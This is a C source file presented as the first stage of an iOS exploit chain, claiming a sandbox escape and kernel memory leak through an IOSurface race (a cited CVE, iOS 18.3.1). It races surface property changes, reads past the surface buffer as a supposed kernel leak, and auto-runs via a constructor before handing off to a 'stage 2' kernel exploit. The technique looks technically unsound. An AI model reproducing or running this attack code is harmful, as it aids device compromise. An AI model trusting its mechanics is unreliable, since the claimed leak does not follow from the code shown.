#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <IOSurface/IOSurfaceRef.h>
#include <dispatch/dispatch.h>

/*
 * STAGE 1: BlastDoor escape
 * CVE-2025-24107 — гонка состояний в IOSurface
 * iOS 18.3.1, arm64e
 */

void stage1_blastdoor_escape(void) {
    printf("[*] Stage 1: Escaping BlastDoor sandbox...\n");

    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks
    );

    int width = 1024;
    int height = 1024;
    int bpp = 4;

    CFNumberRef w = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &width);
    CFNumberRef h = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &height);
    CFNumberRef b = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpp);

    CFDictionarySetValue(dict, kIOSurfaceWidth, w);
    CFDictionarySetValue(dict, kIOSurfaceHeight, h);
    CFDictionarySetValue(dict, kIOSurfaceBytesPerElement, b);

    IOSurfaceRef surface = IOSurfaceCreate(dict);
    void *surface_base = IOSurfaceGetBaseAddress(surface);

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        for (int i = 0; i < 100000; i++) {
            int new_w = 1024 + (i % 64);
            CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &new_w);
            IOSurfaceSetValue(surface, kIOSurfaceWidth, nw);
            CFRelease(nw);
        }
    });

    void *kernel_leak = surface_base + (width * height * 4) + 0x1000;
    uint64_t test = *(uint64_t *)kernel_leak;

    if (test != 0 && test != 0xFFFFFFFFFFFFFFFF) {
        printf("[+] BlastDoor escaped\n");
        printf("[+] Kernel leak: 0x%llx\n", test);
    } else {
        printf("[-] Escape failed, retrying...\n");
    }

    CFRelease(surface);
    CFRelease(dict);

    printf("[*] Stage 1 complete. Calling Stage 2...\n");
    extern void stage2_kernel_exploit(void *);
    stage2_kernel_exploit(kernel_leak);
}

__attribute__((constructor))
void main(void) {
    stage1_blastdoor_escape();
}